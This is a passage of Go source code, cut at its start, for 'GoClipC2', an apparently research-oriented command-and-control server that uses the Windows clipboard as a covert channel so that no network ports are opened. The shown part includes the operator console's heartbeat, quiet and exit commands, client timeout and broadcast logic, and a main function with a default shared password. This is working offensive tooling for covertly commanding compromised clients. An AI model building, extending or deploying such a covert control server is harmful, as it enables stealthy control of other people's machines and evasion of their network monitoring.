				clientInfo.Status = "active"
				clientInfo.SleepUntil = time.Time{}
				s.clients[clientID] = clientInfo

			case "heartbeat":
				if len(parts) < 3 {
					fmt.Println("Usage: heartbeat <client|ALL> <interval>")
					fmt.Println("Example: heartbeat CLIENT1 10s")
					fmt.Println("Example: heartbeat ALL 30s")
					continue
				}
				target := parts[1]
				intervalStr := parts[2]

				interval, err := time.ParseDuration(intervalStr)
				if err != nil {
					fmt.Printf("Invalid interval: %s\n", intervalStr)
					continue
				}

				if interval < MIN_HEARTBEAT || interval > MAX_HEARTBEAT {
					fmt.Printf("Interval must be between %v and %v\n", MIN_HEARTBEAT, MAX_HEARTBEAT)
					continue
				}

				if strings.ToUpper(target) == "ALL" {
					if !s.quietMode {
						log.Printf("[SERVER] Setting heartbeat to %v for all clients", interval)
					}
					for clientID := range s.clients {
						s.channel.SendMessage(MSG_SET_HEARTBEAT, clientID, intervalStr)
					}
					s.heartbeatInterval = interval
				} else {
					if _, exists := s.clients[target]; !exists {
						fmt.Printf("Client %s not found\n", target)
						continue
					}

					if !s.quietMode {
						log.Printf("[SERVER] Setting heartbeat to %v for %s", interval, target)
					}
					s.channel.SendMessage(MSG_SET_HEARTBEAT, target, intervalStr)
				}

			case "quiet":
				s.quietMode = !s.quietMode
				if s.quietMode {
					fmt.Println("Quiet mode enabled - showing only command outputs")
				} else {
					fmt.Println("Quiet mode disabled - showing full server logs")
				}

			case "exit":
				log.Println("[SERVER] Shutting down...")
				s.channel.Stop()
				os.Exit(0)

			default:
				fmt.Printf("Unknown command: %s (type 'help' for commands)\n", command)
			}
		}
	}()
}

func (s *Server) Start() {
	log.Println("[SERVER] Starting clipboard covert channel server...")
	log.Printf("[SERVER] Protocol: %s", PROTOCOL_PREFIX)
	log.Printf("[SERVER] No network ports required - using clipboard as communication channel")

	s.channel.SendMessage(MSG_HEARTBEAT, "BROADCAST", "Server online")

	go func() {
		ticker := time.NewTicker(s.heartbeatInterval)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				cutoff := time.Now().Add(-s.heartbeatInterval * 3)
				for clientID, info := range s.clients {
					if info.LastSeen.Before(cutoff) {
						if !s.quietMode {
							log.Printf("[SERVER] Client %s timed out", clientID)
						}
						delete(s.clients, clientID)
					}
				}

				activeClients := 0
				for _, info := range s.clients {
					if info.Status != "sleeping" || time.Now().After(info.SleepUntil) {
						activeClients++
					}
				}

				if activeClients > 0 {
					s.channel.SendMessage(MSG_HEARTBEAT, "BROADCAST", "ping")
				}
			}
		}
	}()

	if s.interactive {
		s.StartInteractive()
	}

	s.channel.StartMonitoring()
}

func main() {
	var (
		password    = flag.String("password", "research123", "Shared password")
		interactive = flag.Bool("interactive", true, "Start interactive server console")
		debug       = flag.Bool("debug", false, "Enable debug logging")
		heartbeat   = flag.Duration("heartbeat", DEFAULT_HEARTBEAT, "Heartbeat interval")
		quiet       = flag.Bool("quiet", false, "Quiet mode - show only command outputs")
	)
	flag.Parse()

	if *heartbeat < MIN_HEARTBEAT || *heartbeat > MAX_HEARTBEAT {
		log.Fatalf("Heartbeat interval must be between %v and %v", MIN_HEARTBEAT, MAX_HEARTBEAT)
	}

	if !*quiet {
		fmt.Println("=== GoClipC2 ===")
		fmt.Println("")
		fmt.Println("===============================================")
		fmt.Println("")
		fmt.Println("This server uses the Windows clipboard as a covert communication channel.")
		fmt.Println("No network ports are opened - all communication happens via clipboard.")
		fmt.Println("")
		fmt.Printf("Protocol Prefix: %s\n", PROTOCOL_PREFIX)
		fmt.Printf("Encryption: AES-GCM with password-derived key\n")
		fmt.Printf("Heartbeat Interval: %v\n", *heartbeat)
		fmt.Printf("Quiet Mode: %v\n", *quiet)
		fmt.Printf("Interactive Mode: %v\n", *interactive)
		fmt.Println("")
		fmt.Println("")
	}

	server, err := NewServer(*password, *heartbeat, *quiet, *debug)
	if err != nil {
		log.Fatal(err)
	}

	server.interactive = *interactive
	server.Start()
}
